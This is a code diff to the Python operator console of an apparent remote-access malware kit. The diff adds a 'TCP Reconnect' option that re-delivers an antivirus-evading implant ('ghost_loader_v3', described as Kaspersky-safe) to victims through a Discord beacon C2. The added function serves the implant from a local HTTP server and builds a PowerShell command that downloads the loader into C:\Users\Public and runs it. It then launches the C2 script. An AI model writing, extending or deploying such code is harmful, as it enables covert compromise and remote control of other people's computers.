@@ -229,6 +229,7 @@ def render():
     deploy_ops = [
         ("B", "Build Implant",  "Sync token + rebuild + serve",      CYAN),
         ("A", "Auto Deploy",    "Compile + ship implant to target",  RED),
+        ("R", "TCP Reconnect",  "Ghost re-deliver via Discord beacon (KAV-safe)", AMBER),
     ]
     for key, name, desc, color in deploy_ops:
         print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
@@ -566,6 +567,90 @@ def scan_reminder():
     print(f"  {DIM}    python deploy.py --status  — checks all binaries including ghost_loader.exe{RST}\n")
 
 
+def _tcp_reconnect_via_discord():
+    """Re-deliver ghost_loader_v3 via live Discord beacon to restore TCP shell."""
+    import socket as _sock
+    import http.server
+    import threading
+    import json
+    import urllib.request
+
+    print(f"\n  {AMBER}{BOLD}=== TCP RECONNECT VIA DISCORD ==={RST}")
+    print(f"  {DIM}  vader_shell.exe is quarantined — using ghost_loader_v3 (KAV-clean){RST}\n")
+
+    # 1. Check ghost_loader.exe exists
+    ghost_exe = os.path.join(ROOT, "shell", "ghost_loader.exe")
+    if not os.path.exists(ghost_exe):
+        print(f"  {RED}[!] ghost_loader.exe not found — build it first with [G]{RST}")
+        return
+
+    # 2. Get operator LAN IP
+    try:
+        s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        my_ip = s.getsockname()[0]
+        s.close()
+    except Exception:
+        my_ip = "192.168.1.92"
+    print(f"  {GREEN}[*] Operator IP: {my_ip}{RST}")
+
+    # 3. Check ngrok
+    ngrok_addr = None
+    try:
+        with urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3) as r:
+            data = json.loads(r.read())
+            for t in data.get("tunnels", []):
+                if "tcp" in t.get("proto", ""):
+                    ngrok_addr = t["public_url"].replace("tcp://", "")
+                    break
+    except Exception:
+        pass
+    if ngrok_addr:
+        print(f"  {GREEN}[*] ngrok active: {ngrok_addr}{RST}")
+    else:
+        print(f"  {AMBER}[!] ngrok not detected — using LAN delivery only{RST}")
+
+    # 4. Start file server on 8890 serving ROOT
+    import functools
+    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=ROOT)
+    handler.log_message = lambda *a: None
+    fs_started = False
+    try:
+        srv = http.server.HTTPServer(("0.0.0.0", 8890), handler)
+        t = threading.Thread(target=srv.serve_forever, daemon=True)
+        t.start()
+        fs_started = True
+        print(f"  {GREEN}[*] File server: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
+    except OSError:
+        print(f"  {AMBER}[!] Port 8890 already bound — assuming file server running{RST}")
+        fs_started = True
+
+    if not fs_started:
+        print(f"  {RED}[!] File server failed to start{RST}")
+        return
+
+    # 5. Print the command to run in C2
+    print(f"\n  {CYAN}Now open C2 ([D]) and run:{RST}")
+    print(f"  {WHITE}  sessions{RST}        ← find Discord beacon session ID")
+    print(f"  {WHITE}  deploy <id>{RST}      ← re-deliver ghost_loader_v3 to that session")
+    print(f"\n  {DIM}  Or run directly via Discord C2:{RST}")
+    cmd = (
+        f'taskkill /F /IM ghost_loader.exe 2>nul & '
+        f'powershell -c "'
+        f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
+        f'-OutFile \'C:\\\\Users\\\\Public\\\\ghost_loader.exe\'; '
+        f'Start-Process \'C:\\\\Users\\\\Public\\\\ghost_loader.exe\'"'
+    )
+    print(f"  {DIM}  cmd <id> {cmd[:80]}...{RST}")
+    print()
+
+    # 6. Launch C2
+    c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
+    launch = input(f"  {GREEN}Launch C2 now? [Y/n]: {RST}").strip().lower()
+    if launch != "n":
+        subprocess.run([sys.executable, c2_v2], cwd=ROOT)
+
+
 def run_op(choice):
     deploy = os.path.join(ROOT, "deploy.py")
     mutate = os.path.join(ROOT, "mutate.py")
@@ -642,6 +727,8 @@ def run_op(choice):
             subprocess.run([sys.executable, auto_test], cwd=ROOT)
         else:
             print(f"\n  {RED}[!] auto_screenshot_test.py not found{RST}")
+    elif choice.lower() == "r":
+        _tcp_reconnect_via_discord()
     elif choice.lower() == "z":
         my_ip = detect_lan_ip() or "192.168.1.92"
         print(f"\n  {RED}{BOLD}=== FUD AUTO LOOP — ghost mode ==={RST}")
